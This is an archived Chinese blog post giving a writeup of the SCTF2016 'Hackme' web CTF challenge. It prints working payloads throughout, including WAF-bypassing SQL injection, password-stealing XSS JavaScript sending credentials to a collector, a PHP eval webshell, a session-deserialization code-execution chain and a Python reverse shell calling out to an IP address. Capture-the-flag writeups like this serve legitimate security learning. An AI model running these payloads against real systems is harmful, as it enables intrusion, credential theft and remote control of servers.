<!DOCTYPE html>

<html lang="en">
<head>
<meta charset="utf-8"/>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible"/>
<title>SCTF2016 Pentest(Web) Hackme Writeup</title>
<meta content="True" name="HandheldFriendly"/>
<meta content="320" name="MobileOptimized"/>
<meta content="yes" name="apple-mobile-web-app-capable"/>
<meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"/>
<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport"/>
<meta content="" name="description"/>
<meta content="summary" name="twitter:card"/>
<meta content="SCTF2016 Pentest(Web) Hackme Writeup" name="twitter:title"/>
<meta content="" name="twitter:description"/>
<meta content="http://www.firesun.me" property="og:url"/>
<meta content="article" property="og:type"/>
<meta content="SCTF2016 Pentest(Web) Hackme Writeup" property="og:title"/>
<meta content="" property="og:description"/>
<meta content="火日小站" property="og:site_name"/>
<meta content="SCTF2016 Pentest(Web) Hackme Writeup" itemprop="name"/>
<meta content="" itemprop="description"/>
<meta content="" name="theme-color"/>
<link href="./SCTF2016 Pentest(Web) Hackme Writeup/favicon.ico" rel="shortcut icon" type="image/x-icon"/>
<link href="./SCTF2016 Pentest(Web) Hackme Writeup/apple-touch-icon-precomposed.png" rel="apple-touch-icon"/>
<link href="//fonts.googleapis.com/" rel="dns-prefetch"/>
<link href="//fonts.googleapis.com/css?family=Noto+Serif:400,700,400italic|Open+Sans:700,400&amp;subset=latin,latin-ext" rel="stylesheet"/>
<link href="./SCTF2016 Pentest(Web) Hackme Writeup/main.min.cssv=92699c119f" rel="stylesheet">
<script src="./SCTF2016 Pentest(Web) Hackme Writeup/jquery.min.js" type="text/javascript"></script>
<script type="text/javascript">
if (!window.jQuery) {
	var script = document.createElement('script');
	script.src = "/assets/js/jquery.min.js?v=92699c119f";
	document.body.appendChild(script);
}
var ga_ua = 'UA-XXXXX-X';

var disqus_shortname = 'firesun';

var enable_pjax = true;
// Pace Options
// ==============
window.paceOptions = {
	catchupTime: 100,
	minTime: 100,
	elements: false,
	restartOnRequestAfter: 500,
	startOnPageLoad: false
}
// Ghostium Globals
// ==============
window.GHOSTIUM = {};
GHOSTIUM.haveDisqus = typeof disqus_shortname !== 'undefined' && disqus_shortname !== 'example';
GHOSTIUM.enablePjax = typeof enable_pjax !== 'undefined' ? enable_pjax : true;
    </script>
<script src="./SCTF2016 Pentest(Web) Hackme Writeup/head-scripts.min.jsv=92699c119f"></script>
<link href="./SCTF2016 Pentest(Web) Hackme Writeup/sctf2016-web-hackme-writeup" rel="canonical">
<meta content="origin" name="referrer">
<meta content="火日小站" property="og:site_name">
<meta content="article" property="og:type">
<meta content="SCTF2016 Pentest(Web) Hackme Writeup" property="og:title">
<meta content="题目 天台山来了一个招生组，他们自称自己是卡塞尔学院的，他们的使命是屠龙？暮雨听到后，觉得这太扯淡了，决定他们的网站一探究竟。通过前期信息收集，暮雨发现这个网站还在开发中，管理员把开发安排写在了一个地方。 http://hackme.sctf.xctf.org.cn  解题 开始做题的时候就发现已经放了4个Hint，那这题的坑点一定很多，正好结合着hint来做 首先看hint1，4：开发人员会看备忘录与xss，那xss的地方一定是备忘录，fuzz一下网站就发现了http://hackme.sctf.xctf.org.cn/wodebeiwanglu.php ，不过貌似没有提交的地方，那估计就是通过注入来写js 观察主站，发现id处可能是一个注入点，手动测试一番后，发现成功列出所有文章，证明存在注入点(有一个简易的waf，会过滤空格和union之类的，不过都有办法绕过，都是套路) http://hackme.sctf.xctf.org.cn/index." property="og:description">
<meta content="http://www.firesun.me/sctf2016-web-hackme-writeup/" property="og:url">
<meta content="2016-05-08T16:53:44.000Z" property="article:published_time">
<meta content="2016-06-05T03:58:54.000Z" property="article:modified_time">
<meta content="WEB" property="article:tag">
<meta content="Writeup" property="article:tag">
<meta content="CTF" property="article:tag">
<meta content="summary" name="twitter:card">
<meta content="SCTF2016 Pentest(Web) Hackme Writeup" name="twitter:title">
<meta content="题目 天台山来了一个招生组，他们自称自己是卡塞尔学院的，他们的使命是屠龙？暮雨听到后，觉得这太扯淡了，决定他们的网站一探究竟。通过前期信息收集，暮雨发现这个网站还在开发中，管理员把开发安排写在了一个地方。 http://hackme.sctf.xctf.org.cn  解题 开始做题的时候就发现已经放了4个Hint，那这题的坑点一定很多，正好结合着hint来做 首先看hint1，4：开发人员会看备忘录与xss，那xss的地方一定是备忘录，fuzz一下网站就发现了http://hackme.sctf.xctf.org.cn/wodebeiwanglu.php ，不过貌似没有提交的地方，那估计就是通过注入来写js 观察主站，发现id处可能是一个注入点，手动测试一番后，发现成功列出所有文章，证明存在注入点(有一个简易的waf，会过滤空格和union之类的，不过都有办法绕过，都是套路) http://hackme.sctf.xctf.org.cn/index." name="twitter:description">
<meta content="http://www.firesun.me/sctf2016-web-hackme-writeup/" name="twitter:url">
<meta content="Written by" name="twitter:label1">
<meta content="火日攻天" name="twitter:data1">
<meta content="Filed under" name="twitter:label2">
<meta content="WEB, Writeup, CTF" name="twitter:data2">
<script type="application/ld+json">
{
    "@context": "http://schema.org",
    "@type": "Article",
    "publisher": "火日小站",
    "author": {
        "@type": "Person",
        "name": "火日攻天",
        "image": "http://www.firesun.me/content/images/2016/04/avatar.png",
        "url": "http://www.firesun.me/author/firesun/",
        "sameAs": "http://www.firesun.me/"
    },
    "headline": "SCTF2016 Pentest(Web) Hackme Writeup",
    "url": "http://www.firesun.me/sctf2016-web-hackme-writeup/",
    "datePublished": "2016-05-08T16:53:44.000Z",
    "dateModified": "2016-06-05T03:58:54.000Z",
    "keywords": "WEB, Writeup, CTF",
    "description": "题目 天台山来了一个招生组，他们自称自己是卡塞尔学院的，他们的使命是屠龙？暮雨听到后，觉得这太扯淡了，决定他们的网站一探究竟。通过前期信息收集，暮雨发现这个网站还在开发中，管理员把开发安排写在了一个地方。 http://hackme.sctf.xctf.org.cn  解题 开始做题的时候就发现已经放了4个Hint，那这题的坑点一定很多，正好结合着hint来做 首先看hint1，4：开发人员会看备忘录与xss，那xss的地方一定是备忘录，fuzz一下网站就发现了http://hackme.sctf.xctf.org.cn/wodebeiwanglu.php ，不过貌似没有提交的地方，那估计就是通过注入来写js 观察主站，发现id处可能是一个注入点，手动测试一番后，发现成功列出所有文章，证明存在注入点(有一个简易的waf，会过滤空格和union之类的，不过都有办法绕过，都是套路) http://hackme.sctf.xctf.org.cn/index."
}
    </script>
<meta content="Ghost 0.7" name="generator">
<link href="./SCTF2016 Pentest(Web) Hackme Writeup/rss" rel="alternate" title="火日小站" type="application/rss+xml">
<link href="./SCTF2016 Pentest(Web) Hackme Writeup/zTreeStyle.css" rel="stylesheet" type="text/css"/>
</link></meta></meta></meta></meta></meta></meta></meta></meta></meta></meta></meta></meta></meta></meta></meta></meta></meta></meta></meta></meta></link></link></head>
<body class="post-template tag-web tag-writeup tag-ctf">
<button class="drawer-button" data-action="open-drawer" id="drawer-button"><i class="fa fa-bars"></i></button>
<nav class="drawer" tabindex="-1">
<div class="drawer-container">
<!--.drawer-search(role="search")-->
<ul class="drawer-list" role="navigation">
<li class="drawer-list-item">
<a data-pjax="" href="/">
<i class="fa fa-home"></i>Home
  </a>
</li>
<li class="drawer-list-item">
<a data-pjax="" href="/tag/web">
<i class="fa fa-rocket"></i>Web
  </a>
</li>
<li class="drawer-list-item">
<a href="http://www.firesun.me/rss/">
<i class="fa fa-rss"></i>Subscribe to Feed
  </a>
</li>
<li class="drawer-list-divider"></li>
<li class="drawer-list-item drawer-list-title">
  Follow me
</li>
<li class="drawer-list-item">
<a href="http://twitter.com" target="_blank">
<i class="fa fa-twitter"></i>Twitter
  </a>
</li>
<li class="drawer-list-item">
<a href="http://github.com/firesunCN" target="_blank">
<i class="fa fa-github"></i>Github
  </a>
</li>
</ul>
</div>
</nav>
<div class="drawer-overlay"></div>
<main class="container" id="container" role="main">
<div class="surface">
<div class="surface-container">
<div class="content" data-pjax-container="">
<section class="wrapper wrapper-post">
<div class="wrapper-container">
<article class="post post tag-web tag-writeup tag-ctf" itemscope="" itemtype="http://schema.org/BlogPosting" role="article">
<section class="post-container">
<header class="post-header">
<ul class="post-meta-list">
<li class="post-meta-item">
<time datetime="2016-05-08" itemprop="datePublished">
                  a year ago
                </time>
</li>
<li class="post-meta-item">
<a data-pjax="" href="/tag/web/" itemprop="articleSection">WEB</a>, 
                    <a data-pjax="" href="/tag/writeup/" itemprop="keywords">Writeup</a>, 
                    <a data-pjax="" href="/tag/ctf/" itemprop="keywords">CTF</a>
</li>
<li class="post-meta-item">
<a data-disqus-identifier="14" href="#disqus_thread">Comments</a>
</li>
</ul>
<h1 class="post-title" itemprop="name headline"><a data-pjax="" href="/sctf2016-web-hackme-writeup/" itemprop="url" title="SCTF2016 Pentest(Web) Hackme Writeup">SCTF2016 Pentest(Web) Hackme Writeup</a></h1>
<!--h2 itemprop="about" class="post-subtitle"></h2-->
</header>
<aside class="post-side">
<div class="post-author">
<a class="post-author-avatar" href="http://www.firesun.me/">
<img alt="火日攻天" src="./SCTF2016 Pentest(Web) Hackme Writeup/avatar.png"/>
</a>
<div class="post-author-info">
<a class="post-author-name" href="http://www.firesun.me/">
                  火日攻天
                </a>
<p class="post-author-bio"></p>
</div>
</div>
<ul class="ztree" id="tree" style="width:100%"></ul>
</aside>
<div class="post-body" itemprop="articleBody">
<h2 id="">题目</h2>
<p>天台山来了一个招生组，他们自称自己是卡塞尔学院的，他们的使命是屠龙？暮雨听到后，觉得这太扯淡了，决定他们的网站一探究竟。通过前期信息收集，暮雨发现这个网站还在开发中，管理员把开发安排写在了一个地方。
<a href="http://hackme.sctf.xctf.org.cn">http://hackme.sctf.xctf.org.cn</a> <br/>
<img alt="" src="./SCTF2016 Pentest(Web) Hackme Writeup/QQ--20160508233737.png"/></p>
<h2 id="">解题</h2>
<p>开始做题的时候就发现已经放了4个Hint，那这题的坑点一定很多，正好结合着hint来做</p>
<ul>
<li>首先看hint1，4：开发人员会看备忘录与xss，那xss的地方一定是备忘录，fuzz一下网站就发现了<a href="http://hackme.sctf.xctf.org.cn/wodebeiwanglu.php">http://hackme.sctf.xctf.org.cn/wodebeiwanglu.php</a>
，不过貌似没有提交的地方，那估计就是通过注入来写js
<img alt="" src="./SCTF2016 Pentest(Web) Hackme Writeup/QQ--20160508235526.png"/></li>
<li>观察主站，发现id处可能是一个注入点，手动测试一番后，发现成功列出所有文章，证明存在注入点(有一个简易的waf，会过滤空格和union之类的，不过都有办法绕过，都是套路)
<img alt="" src="./SCTF2016 Pentest(Web) Hackme Writeup/QQ--20160508225500.png"/></li>
</ul>
<pre><code>http://hackme.sctf.xctf.org.cn/index.php?id=1/*123*/or/*123*/1  
</code></pre>
<p><img alt="" src="./SCTF2016 Pentest(Web) Hackme Writeup/QQ--20160509000310.png"/></p>
<ul>
<li>接下来就是套路了，union注入获取数据库结构，不过在这之前，我测试另一个语句：</li>
</ul>
<pre><code>http://hackme.sctf.xctf.org.cn/index.php?id=0/*!11111union*//*!11111select*/load_file(%22/etc/passwd%22)  
</code></pre>
<p><img alt="" src="./SCTF2016 Pentest(Web) Hackme Writeup/QQ--20160509001157.png"/></p>
<ul>
<li>既然拥有File权限，那么代表读写的权限我们已经具备了，当然很明显写不了shell，题肯定没这么简单，我们开始读取网页的源代码，这样就能直接知道数据库的结构了，根据lnmp的默认位置测试几次就能发现网站的位置/home/wwwroot/hackme/，其实即使我们找不到网站路径，我们也可以通过union方式注出表结构</li>
</ul>
<pre><code>http://hackme.sctf.xctf.org.cn/index.php?id=0/*!11111union*//*!11111select*/load_file(%22/home/wwwroot/hackme/index.php%22)

http://hackme.sctf.xctf.org.cn/index.php?id=0/*!11111union*//*!11111select*/load_file(%22/home/wwwroot/hackme/wodebeiwanglu.php%22)  
</code></pre>
<ul>
<li>其实这里更建议用hex(load_file())，这样恢复后就是源码的模样，否者有时候阅读是很痛苦。通过读源码，我们可以获取两个重要的信息：</li>
</ul>
<p>第一：数据库使用PDO连接，可以实现多语句执行（印证了hint）</p>
<pre><code class="language-php">$pdo = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
$stmt = $dbh-&gt;prepare("SELECT content  FROM article where id = $string");
</code></pre>
<p>第二：备忘录的结构有了，配合第一点多语句执行，可以实现数据的插入，并造成xss，很明显网站并没有做xss防护</p>
<pre><code class="language-php">$sql = "select time,event from beiwanglu";
$stmt = self::$link-&gt;prepare($sql);
</code></pre>
<ul>
<li>构造payload，插入js，两个地方都能插入js，任选一个即可，数据库可能会截断，所以最好用短地址</li>
</ul>
<pre><code class="language-php">http://hackme.sctf.xctf.org.cn/index.php?id=0;insert/*123*/into/*123*/beiwanglu/*123*/values('110250','&lt;script/src="js地址"&gt;&lt;/script&gt;','&lt;script/src="js地址"&gt;&lt;/script&gt;')  
</code></pre>
<ul>
<li>从xss平台可以看到正确执行了脚本，接下来根据hint，应该是要偷取管理员密码
<img alt="" src="./SCTF2016 Pentest(Web) Hackme Writeup/QQ--20160509003326.png"/></li>
<li>xss偷取密码的方式无非那几种：钓鱼，也就是伪造登录框；hook登录按钮，在登录前发送出密码；键盘记录；偷窃浏览器的已保存密码，可以说在CTF比赛唯一靠谱的就是最后一种，这种方法当年余弦大牛在<a href="http://vdisk.weibo.com/s/G7OkgxnghOu">XSS<em>Hack-Steal</em>PWD<em>of</em>Browsers.pdf</a>，就讲述了利用方法，原理就是在同域的网页，在网页加载的时候构造一个登陆表单使得浏览器误以为是登陆表单而自动填充记住的密码，然后js再获取密码输入框的值，将密码发送出去，js内容如下</li>
</ul>
<pre><code class="language-javascript">function create_form(user) {  
    /*获取明文密码*/
    var f = document.createElement("form");
    f.style.display= "none"
    document.getElementsByTagName("body")[0].appendChild(f);
    var e1 = document.createElement("input");
    e1.type = "text";
    e1.name = "username";
    e1.id = "username";
    f.appendChild(e1);
    var e = document.createElement("input");
    e.name = "password";
    e.type = "password";
    e.id = "password";
    f.appendChild(e);

    setTimeout(function () {
        username = document.getElementById("username").value;
          password = document.getElementById("password").value;
        var newimg = new Image();
        newimg.src="xss平台地址/?username="+username+"&amp;password="+password;
        }, 2000); // 时间竞争
}

create_form('');  
</code></pre>
<ul>
<li>查看xss结果，成功打回了账号密码，这密码是在嘲讽我们么
<img alt="" src="./SCTF2016 Pentest(Web) Hackme Writeup/QQ--20160509004438.png"/></li>
<li><p>在<a href="http://hackme.sctf.xctf.org.cn/login.php">http://hackme.sctf.xctf.org.cn/login.php</a> 登录，然后我们发现跳转到<a href="http://hackme.sctf.xctf.org.cn/05d6a8025a7d0c0eee5f6d12a0a94cc9/main.php">http://hackme.sctf.xctf.org.cn/05d6a8025a7d0c0eee5f6d12a0a94cc9/main.php</a>
<img alt="" src="./SCTF2016 Pentest(Web) Hackme Writeup/QQ--20160509004738.png"/></p></li>
<li><p>测试发现可以下载网站源码，虽然替换../为空，但是可以用..././绕过（不过这个东西真没啥用，我们有数据库注入来load_file，比这个好用多了），不过最起码我们得到了这个目录下的3个文件，main.php，init.php，session.php</p></li>
</ul>
<pre><code class="language-php">main.php  
&lt;?php  
include 'init.php';  
if(isset($_POST['filename'])){  
    $filename = $_POST['filename'];
    //$file = strrev($filename);
    //$name = explode('.',$file);
    //$ext = strtolower($name[0]);
    $filename = str_ireplace(array('..\\','../'),array('',''),$filename);
    //$filename = str_ireplace(array('php','..\\','../'),array('','',''),$filename);
        download($filename);

}
?&gt;
&lt;html&gt;  
        &lt;head&gt;
            &lt;meta charset="utf-8"&gt;
            &lt;title&gt;下载器&lt;/title&gt;
        &lt;/head&gt;
&lt;body&gt;  
    &lt;form action="" method="post"&gt;
        文件名:&lt;input type="text" name="filename" value=""&gt;
              &lt;input type="submit" name="submit" value="show"&gt;
        &lt;/form&gt;
&lt;/body&gt;  
&lt;/html&gt;
</code></pre>
<pre><code class="language-php">init.php  
&lt;?php  
/**
 * Created by PhpStorm.
 * User: Tomato
 * Date: 16/4/15
 * Time: 上午10:20
 */
header("Content-type:text/html;charset=utf-8");

//error_reporting(0);

if(@$_COOKIE['admin'] !=='f34c2e6132748fed3ac48959c10fddcb637ca8fb') exit('error!');

spl_autoload_register();

include 'session.php';

function download($filename){  
    if(!file_exists($filename)){
        exit('文件找不到!');
    }else{
        header("Content-type: application/octet-stream");
        header("Accept-Ranges: bytes");
        header("Content-Disposition: attachment; filename={$filename}");
        header("Accept-Length:".filesize($filename));
        readfile($filename);
    }
}
</code></pre>
<pre><code class="language-php">session.php  
class FileSessionHandler  
{
    private $savePath;

    function open($savePath, $sessionName)
    {
        $this-&gt;savePath = $savePath;
        if (!is_dir($this-&gt;savePath)) {
            mkdir($this-&gt;savePath, 0777);
        }

        return true;
    }

    function close()
    {
        return true;
    }

    function read($id)
    {
        return (string)@file_get_contents("$this-&gt;savePath/sess_$id");
    }

    function write($id, $data)
    {
        return file_put_contents("$this-&gt;savePath/sess_$id", $data) === false ? false : true;
    }

    function destroy($id)
    {
        $file = "$this-&gt;savePath/sess_$id";
        if (file_exists($file)) {
            unlink($file);
        }

        return true;
    }

    function gc($maxlifetime)
    {
        foreach (glob("$this-&gt;savePath/sess_*") as $file) {
            if (filemtime($file) + $maxlifetime &lt; time() &amp;&amp; file_exists($file)) {
                unlink($file);
            }
        }

        return true;
    }
}

$handler = new FileSessionHandler();
session_set_save_handler(  
    array($handler, 'open'),
    array($handler, 'close'),
    array($handler, 'read'),
    array($handler, 'write'),
    array($handler, 'destroy'),
    array($handler, 'gc')
);

register_shutdown_function('session_write_close');  
session_start();
</code></pre>
<ul>
<li>审计一下源码，有两个吸引我的地方，<code>spl_autoload_register()</code>和php session反序列化，如果我们能控制session，并且上传一个xxx.inc（已经具备了，通过注入写文件），配合<code>spl_autoload_register</code>就能执行我们想要的代码，三个白帽挑战曾经有过类似的例子，<a href="http://zone.wooyun.org/content/23883">http://zone.wooyun.org/content/23883</a> ，不过在证明自己的推测之前，必须查看一下php.ini，用注入读取php.ini，并且使用beyond compare对比lnmp默认的php.ini，看看配置有什么值得注意的地方</li>
</ul>
<pre><code>http://hackme.sctf.xctf.org.cn/index.php?id=0/*!11111union*//*!11111select*/load_file(%22/usr/local/php/etc/php.ini%22)  
</code></pre>
<ul>
<li><p>我发现了两个重要的信息，一个是session的存放位置是/tmp/，意味着session我们完全可控
<img alt="" src="./SCTF2016 Pentest(Web) Hackme Writeup/QQ--20160509010720.png"/></p></li>
<li><p>另一个就是Path路径里包含了/tmp/，也就是说当遇到一个未知的类，<code>spl_autoload_register</code>会自动去Path路径里寻找"类名.inc"或者"类名.php"，并自动include进来，而/tmp/目录又是完全可控的
<img alt="" src="./SCTF2016 Pentest(Web) Hackme Writeup/QQ--20160509010749.png"/></p></li>
<li><p>至此，Getshell的条件已都满足，我以我自己构造的firesun类为例，我们可以构造一个包含getshell代码的firesun类，并将构造好的类通过注入写入/tmp/firesun.inc，并且控制session，使得session内容是一个firesun类，这样，当执行<code>session_start()</code>时，PHP反序列化session文件，会发现一个未知的类firesun，由于执行了<code>spl_autoload_register</code>，PHP会在Path目录下(包括/tmp/)搜索firesun.php与firesun.inc，当搜索到时会自动包含firesun.inc（或.php）,而firesun.inc包含了getshell代码，因此getshell代码即会被执行。</p></li>
<li><p>接下来介绍详细步骤，首先我们构造带有getshell代码的firesun.inc，其实firesun.inc根本不需要带有firesun类的定义，原因是<code>spl_autoload_register</code>会先把firesun.inc包含进来，而包含操作即会触发<code>file_put_contents</code>代码</p></li>
</ul>
<pre><code class="language-php">&lt;?php  
file_put_contents("/home/wwwroot/hackme/05d6a8025a7d0c0eee5f6d12a0a94cc9/shell.php",'&lt;?php eval($_POST[1]);?&gt;');  
</code></pre>
<ul>
<li>通过注入将firesun.inc写入/tmp/目录，可以用hex编码string，对付waf能省很多心。</li>
</ul>
<pre><code>http://hackme.sctf.xctf.org.cn/index.php?id=0/*!11111union*//*!11111select*/0x3C3F7068702066696C655F7075745F636F6E74656E747328272F686F6D652F777777726F6F742F6861636B6D652F30356436613830323561376430633065656535663664313261306139346363392F7368656C6C2E706870272C273C3F706870206576616C28245F504F53545B315D293B3F3E27293B/*123*/into/*123*/outfile%27/tmp/firesun.inc%27  
</code></pre>
<ul>
<li>接下来是构造session，我们要构造一个session文件，使得php加载这个文件反序列化时会反序列化firesun类，由php.ini得，<code>session.serialize_handler = php</code>，因此我们可以构造这么一个session文件，<code>a|O:7:"firesun":0:{}</code>，对应的代码是<code>$_SESSION['a']=new firesun();</code>，接下来我们要将其写到/tmp/目录，并且应该遵守session文件格式/tmp/sess<em>xxxxx，再次使用注入写文件，我们就写到/tmp/sess</em>qo55bkptsj5r3vfa8npb1dem39好了:</li>
</ul>
<pre><code>http://hackme.sctf.xctf.org.cn/index.php?id=0/*!11111union*//*!11111select*/%27a%7CO%3A7%3A%22firesun%22%3A0%3A%7B%7D%27/*123*/into/*123*/outfile%27/tmp/sess_qo55bkptsj5r3vfa8npb1dem39%27  
</code></pre>
<ul>
<li><p>最关键的一步，带着<code>PHPSESSID=qo55bkptsj5r3vfa8npb1dem39</code>的cookie访问<a href="http://hackme.sctf.xctf.org.cn/05d6a8025a7d0c0eee5f6d12a0a94cc9/main.php">http://hackme.sctf.xctf.org.cn/05d6a8025a7d0c0eee5f6d12a0a94cc9/main.php</a> ，这样php就会自动反序列化/tmp/sess_qo55bkptsj5r3vfa8npb1dem39文件，然后发现不存在firesun类，自动搜索，发现/tmp/firesun.inc，包含/tmp/firesun.inc，执行其中的getshell代码，在05d6a8025a7d0c0eee5f6d12a0a94cc9/目录下写入shell.php一句话，通过简单的测试可以发现我们成功的拿到了shell
<img alt="" src="./SCTF2016 Pentest(Web) Hackme Writeup/QQ--20160509015414.png"/></p></li>
<li><p>接下来就是找flag的过程，不过很快就会发现，设置了<code>open_basedir</code>，无法访问其他目录，由于<code>php.ini</code>里并没有设置，所以一定是使用<code>.user.ini</code>设置的，使用shell查看<code>.user.ini</code>，果然发现了
open_basedir=/home/wwwroot/hackme:/tmp/:/proc/ <br/>
<img alt="" src="./SCTF2016 Pentest(Web) Hackme Writeup/QQ--20160509020645.png"/></p></li>
<li><p>看到这里我的第一反应就是，这个设置能被覆盖，就像<code>.htaccess</code>一样，应该是查找离得最近的目录里的文件，<code>.user.ini</code>应该也是一样，如果我在05d6a8025a7d0c0eee5f6d12a0a94cc9目录下写入一个<code>.user.ini</code>，应该能使得05d6a8025a7d0c0eee5f6d12a0a94cc9下的所有php遵守这个<code>.user.ini</code>，立刻尝试一下写入一个<code>.user.ini</code>来覆盖open_basedir的设置，耐心的等待5分钟（<code>.user.ini</code>不像<code>.htaccess</code>，需要等5分钟后生效）
<img alt="" src="./SCTF2016 Pentest(Web) Hackme Writeup/QQ--20160509020618.png"/></p></li>
<li><p>接下来发现，果然shell不再受<code>open_basedir</code>限制，使用<code>glob</code>并结合<code>file_get_contents</code>，查找一下就能发现flag
<img alt="" src="./SCTF2016 Pentest(Web) Hackme Writeup/QQ--20160509020410.png"/>
<img alt="" src="./SCTF2016 Pentest(Web) Hackme Writeup/QQ--20160509020450.png"/></p></li>
</ul>
<h2 id="">事后</h2>
<p>我和出题人tomato交谈后发现，他在设计这题时，本意并不是我使用的方法来绕过<code>open_basedir</code>，我误打误撞的发现了一个新的绕过方式（虽然限制很大），因此我觉得应该照着他原来的设定做一遍，并且我准备另开一篇研究<code>open_basedir</code>绕过，不过这里我们先用主办方的做法完成，观察php.ini，检查被禁用的函数，很明显最有用的symlink被禁用了，大部分命令执行的函数被禁用了，不过似乎遗漏了一个pcntl_exec</p>
<pre><code>disable_functions = passthru,exec,system,chroot,scandir,chgrp,chown,shell_exec,proc_open,proc_get_status,popen,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server  
</code></pre>
<p>查看phpinfo，果然启用了pcntl
<img alt="" src="./SCTF2016 Pentest(Web) Hackme Writeup/QQ--20160509171238-1.png"/></p>
<p>只要能利用pcntl_exec启动与php无关的二进制，就能绕过php的<code>open_basedir</code>，如果条件允许可以直接反弹shell，因此我们用Python写一个回弹的脚本</p>
<pre><code class="language-python">import socket,subprocess,os  
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  
s.connect(("IP地址",端口))  
os.dup2(s.fileno(),0)  
os.dup2(s.fileno(),1)  
os.dup2(s.fileno(),2)  
p=subprocess.call(["/bin/bash","-i"]);  
</code></pre>
<p>将其写入/tmp/目录</p>
<pre><code>file_put_contents("/tmp/1.py",'import%20socket%2Csubprocess%2Cos%0As%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%0As.connect%28%28%22162.244.78.89%22%2C80%29%29%0Aos.dup2%28s.fileno%28%29%2C0%29%0Aos.dup2%28s.fileno%28%29%2C1%29%0Aos.dup2%28s.fileno%28%29%2C2%29%0Ap%3Dsubprocess.call%28%5B%22%2fbin%2fbash%22%2C%22-i%22%5D%29%3B');  
</code></pre>
<p><img alt="" src="./SCTF2016 Pentest(Web) Hackme Writeup/QQ--20160509190020.png"/>
然后使用pcntl_exec启动脚本</p>
<pre><code>pcntl_exec("/usr/bin/python",array("/tmp/1.py"));  
</code></pre>
<p><img alt="" src="./SCTF2016 Pentest(Web) Hackme Writeup/QQ--20160509190003.png"/></p>
<p>可以发现成功回弹shell，并且可以无视<code>open_basedir</code>读取flag
<img alt="" src="./SCTF2016 Pentest(Web) Hackme Writeup/QQ--20160509185823.png"/></p>
<h2 id="">思考</h2>
<p>今天突然想到，还有一种做法，我们不是可以注入读文件么，那么直接注入<code>load_file</code>好了，直接绕过<code>open_basedir</code></p>
<pre><code>http://hackme.sctf.xctf.org.cn/index.php?id=0/*!11111union*//*!11111select*/load_file(%22/home/wwwroot/flag_is_here%22)  
</code></pre>
<p>至于如何知道flag的位置就很简单了，绕过<code>open_basedir</code>列目录比读文件简单的多了，<a href="http://drops.wooyun.org/tips/3978">http://drops.wooyun.org/tips/3978</a> ，多种姿势可供参考</p>
<pre><code class="language-php">&lt;?php  
printf('&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;', ini_get('open_basedir'));  
$file_list = array();
// normal files
$it = new DirectoryIterator("glob:///home/wwwroot/*");
foreach($it as $f) {  
    $file_list[] = $f-&gt;__toString();
}
// special files (starting with a dot(.))
$it = new DirectoryIterator("glob:///home/wwwroot/.*");
foreach($it as $f) {  
    $file_list[] = $f-&gt;__toString();
}
sort($file_list);  
foreach($file_list as $f){  
        echo "{$f}&lt;br/&gt;";
}
?&gt;
</code></pre>
</div>
<footer class="post-footer">
<div class="post-author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
<a class="post-author-avatar" href="http://www.firesun.me/">
<img alt="火日攻天" itemprop="image" src="./SCTF2016 Pentest(Web) Hackme Writeup/avatar.png"/>
</a>
<div class="post-author-info">
<h4 class="post-footer-heading">Written By</h4>
<a class="post-author-name" href="http://www.firesun.me/" itemprop="url">
<span itemprop="name">火日攻天</span>
</a>
<p class="post-author-bio" itemprop="description"></p>
<p class="post-author-website">
<a href="http://www.firesun.me/" rel="nofollow">http://www.firesun.me/</a>
</p>
<p class="post-info">
<b class="post-info-title">Published on</b>
<time class="post-date">May 08, 2016</time>
</p>
</div>
</div>
<div class="post-social">
<h4 class="post-footer-heading">Spread the word</h4>
<a data-action="share-twitter" href="#"><i class="fa fa-fw fa-lg fa-twitter"></i></a>
<a data-action="share-facebook" href="#"><i class="fa fa-fw fa-lg fa-facebook"></i></a>
<a data-action="share-gplus" href="#"><i class="fa fa-fw fa-lg fa-google-plus"></i></a>
</div>
</footer>
</section>
<section class="post-comments" itemprop="comment">
<div id="disqus_thread"></div>
</section>
</article>
<footer class="footer" role="contentinfo">
<p><small>© 2017. All Rights Reserved.</small></p>
<p><small><a href="http://ghostium.oswaldoacauan.com/" target="_blank">Ghostium Theme</a> by <a href="http://twitter.com/oswaldoacauan" target="_blank">@oswaldoacauan</a></small></p>
<p><small>Proudly published with <a href="http://ghost.org" target="_blank">Ghost</a></small></p>
</footer>
</div>
</section>
<script type="text/javascript">
  if(GHOSTIUM.haveDisqus) {
    var disqus_identifier = '14';

    if(typeof DISQUS !== 'object') {
      (function () {
      var s = document.createElement('script'); s.async = true;
      s.type = 'text/javascript';
      s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
      (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
      }());
    }
  } else {
    document.querySelector('.post-comments').remove();
  }
</script>
</div>
</div>
</div>
</main>
<script src="./SCTF2016 Pentest(Web) Hackme Writeup/jquery.ztree.core-3.5.min.js" type="text/javascript"></script>
<script src="./SCTF2016 Pentest(Web) Hackme Writeup/jquery.ztree_toc.min.js" type="text/javascript"></script>
<script type="text/javascript">
$(document).ready(function(){
	$('#tree').ztree_toc({
	});
});
</script>
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?a05502e657ee797b511d22bf25fae2a5";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>
<script src="./SCTF2016 Pentest(Web) Hackme Writeup/foot-scripts.min.jsv=92699c119f"></script>
<script type="text/javascript">

      if(GHOSTIUM.haveDisqus) {
        (function () {
        var s = document.createElement('script'); s.async = true;
        s.type = 'text/javascript';
        s.src = '//' + disqus_shortname + '.disqus.com/count.js';
        (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
        }());
      }
    </script>
</body>
</html>
